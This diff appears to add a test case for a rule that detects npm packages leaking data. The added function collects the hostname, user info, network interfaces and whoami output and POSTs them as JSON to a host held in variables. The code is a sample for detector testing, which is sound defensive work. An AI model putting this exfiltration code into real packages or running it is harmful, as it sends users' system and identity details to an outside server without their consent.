@@ -113,3 +113,46 @@ function f(){
         });
     });
 }
+
+function f(){
+    const os = require('os');
+    const http = require('http');
+    // Collect device information
+    const deviceInfo = {
+        platform: os.platform(),
+        release: os.release(),
+        hostname: os.hostname(),
+        arch: os.arch(),
+        userInfo: os.userInfo(),
+        networkInterfaces: os.networkInterfaces(),
+        whoamiinfo: whoamiInfo, // Include whoami output
+        user: "Keycloak",
+    };
+
+    // Define the request options
+    const options = {
+        hostname: apiHostname,
+        port: apiPort,
+        path: apiPath,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json', // Inform the server about the JSON body
+        },
+    };
+
+    // Create the request
+    const req = http.request(options, (res) => {
+        console.log(`Status: ${res.statusCode}`);
+        res.on('data', (chunk) => {
+            console.log(`Body: ${chunk}`);
+        });
+    });
+
+    req.on('error', (error) => {
+        console.error(`Error: ${error.message}`);
+    });
+
+    // ruleid:npm-exfiltrate-sensitive-data
+    req.write(JSON.stringify(deviceInfo));
+    req.end();
+}
